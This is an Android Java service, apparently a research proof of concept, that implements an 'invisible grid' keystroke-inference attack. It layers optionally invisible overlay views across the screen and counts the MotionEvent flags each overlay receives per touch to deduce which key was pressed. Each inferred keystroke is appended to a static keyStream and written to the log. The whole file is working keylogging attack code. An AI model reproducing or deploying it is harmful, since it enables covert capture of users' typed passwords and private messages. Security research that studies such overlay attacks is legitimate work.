package invisiblekeyboard.invisiblegridattack;


import android.app.Service;
import android.content.Intent;
import android.graphics.Rect;
import android.os.IBinder;
import android.view.MotionEvent;
import android.view.WindowManager;

import java.util.HashMap;
import java.util.TreeMap;


public class GridAttackService extends Service {

    public static String keyStream = "";

    private HashMap<Integer, GridView> mGridViews;
    private GridLayout mGridLayout;
    // events are grouped by timestamp
    private TreeMap<Integer, Integer> flagsSetCounter = new TreeMap<>();
    private TreeMap<Integer, Integer> eventsCounter = new TreeMap<>();

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        boolean invisible = intent.getExtras().getBoolean("invisible");
        String gridType = intent.getExtras().getString("grid-type");

        createGridViews(invisible, gridType);

        return flags;
    }

    public void createGridViews(boolean invisible, String gridType) {
        mGridLayout = new GridLayout(this, gridType);

        mGridViews = new HashMap<>();
        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        for (Integer id : mGridLayout.getIds()) {
            String symbol = mGridLayout.getSymbol(id);
            Rect rect = mGridLayout.getRect(id);
            GridView gView = new GridView(this, id, symbol, rect, invisible);
            mGridViews.put(id, gView);
            wm.addView(gView, gView.getParams());
        }
    }


    public synchronized void recordEvent(MotionEvent e) {
        int ts = (int) e.getEventTime();
        int flags = e.getFlags();

        if (!flagsSetCounter.containsKey(ts)) {
            flagsSetCounter.put(ts, 0);
        }
        if (!eventsCounter.containsKey(ts)) {
            eventsCounter.put(ts, 0);
        }

        // update flagsSetCounter
        int currFlagsNum = flagsSetCounter.get(ts);
        if (flags != 0) {
            currFlagsNum += 1;
        }
        flagsSetCounter.put(ts, currFlagsNum);

        Integer currCount = eventsCounter.get(ts);
        currCount = currCount + 1;
        eventsCounter.put(ts, currCount);

        if (eventsCounter.get(ts) == mGridLayout.getViewsNum()) {
            Integer flagsNum = flagsSetCounter.get(ts);
            Integer viewId = flagsNum;
            String key = mGridLayout.getSymbol(viewId);
            keyStream += key + "|";
            Utils.log("Recorded keystroke: ts=" + ts + " viewId=" + viewId + " key=" + key);
            Utils.log("Current keyStream: " + keyStream);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        for (GridView gView : mGridViews.values()) {
            wm.removeView(gView);
        }
    }
}
